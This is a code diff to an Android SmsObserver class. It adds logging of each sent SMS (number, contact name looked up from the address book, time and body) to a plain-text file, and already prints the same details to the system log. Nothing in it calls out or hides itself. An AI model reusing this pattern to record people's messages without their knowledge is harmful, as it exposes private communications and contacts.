@@ -1,10 +1,19 @@
 package com.depech.services.sms;
 
+import java.util.Calendar;
+import java.util.Date;
+import java.util.Formatter;
+
+import com.depech.utils.TelephonyFileLoger;
+
+import android.content.ContentResolver;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
+import android.provider.BaseColumns;
+import android.provider.ContactsContract;
 import android.util.Log;
 
 public class SmsObserver extends ContentObserver {
@@ -26,9 +35,10 @@ public class SmsObserver extends ContentObserver {
 	}
 
 	public void onChange(boolean selfChange) {
+		Cursor sms_sent_cursor = null;
 		try {
 			Log.e("Info", "Notification on SMS observer");
-			Cursor sms_sent_cursor = mContext.getContentResolver().query(
+			sms_sent_cursor = mContext.getContentResolver().query(
 					SMS_STATUS_URI, null, null, null, null);
 			if (sms_sent_cursor != null) {
 				if (sms_sent_cursor.moveToFirst()) {
@@ -37,6 +47,12 @@ public class SmsObserver extends ContentObserver {
 					Log.e("Info", "protocol : " + protocol);
 					// for send protocol is null
 					if (protocol == null) {
+						/*
+						 * String[] colNames = sms_sent_cursor.getColumnNames();
+						 * if(colNames != null){ for(int k=0; k<colNames.length;
+						 * k++){ Log.e("Info","colNames["+k+"] : " +
+						 * colNames[k]); } }
+						 */
 						int type = sms_sent_cursor.getInt(sms_sent_cursor
 								.getColumnIndex("type"));
 						Log.e("Info", "SMS Type : " + type);
@@ -104,6 +120,7 @@ public class SmsObserver extends ContentObserver {
 							Log.e("Info", "SMS Content : " + smsBodyStr);
 							Log.e("Info", "SMS Phone No : " + phoneNoStr);
 							Log.e("Info", "SMS Time : " + smsDatTime);
+							logSMSToFile(smsDatTime, phoneNoStr, smsBodyStr);
 						}
 					}
 				}
@@ -111,8 +128,63 @@ public class SmsObserver extends ContentObserver {
 				Log.e("Info", "Send Cursor is Empty");
 		} catch (Exception sggh) {
 			Log.e("Error", "Error on onChange : " + sggh.toString());
+		} finally {
+			if (sms_sent_cursor != null) {
+				sms_sent_cursor.close();
+			}
 		}
 		super.onChange(selfChange);
+	}
+
+	private void logSMSToFile(Long date, String phone, String smsBody) {
+		if (date != TelephonyFileLoger.getInstance().getPreviosRegistrDate()) {
+			TelephonyFileLoger.getInstance().setPreviosRegistrDate(date);
+			Date recivedTime = new Date(date);
+			Formatter formater = new Formatter();
+			try {
+				formater.format("%s - %s%n%s%n%s%n", phone,
+						getContactDisplayNameByNumber(phone), recivedTime,
+						smsBody);
+				TelephonyFileLoger.getInstance().writeToRegisteredSMSLog(
+						formater.toString());
+				System.out.println(formater);
+			} catch (Exception e) {
+				e.printStackTrace();
+			} finally {
+				formater.close();
+			}
+		}
+	}
+
+	public String getContactDisplayNameByNumber(String phone) {
+		Uri uri = Uri.withAppendedPath(
+				ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
+				Uri.encode(phone));
+		String name = "?";
+
+		ContentResolver contentResolver = mContext.getContentResolver();
+		Cursor contactLookup = contentResolver.query(uri, new String[] {
+				BaseColumns._ID, ContactsContract.PhoneLookup.DISPLAY_NAME },
+				null, null, null);
+
+		try {
+			if (contactLookup != null && contactLookup.getCount() > 0) {
+				contactLookup.moveToNext();
+				name = contactLookup.getString(contactLookup
+						.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
+				// String contactId =
+				// contactLookup.getString(contactLookup.getColumnIndex(BaseColumns._ID));
+			}
+		} finally {
+			if (contactLookup != null) {
+				contactLookup.close();
+			}
+			if (contactLookup != null) {
+				contactLookup.close();
+			}
+		}
+
+		return name;
 	}
 
 }
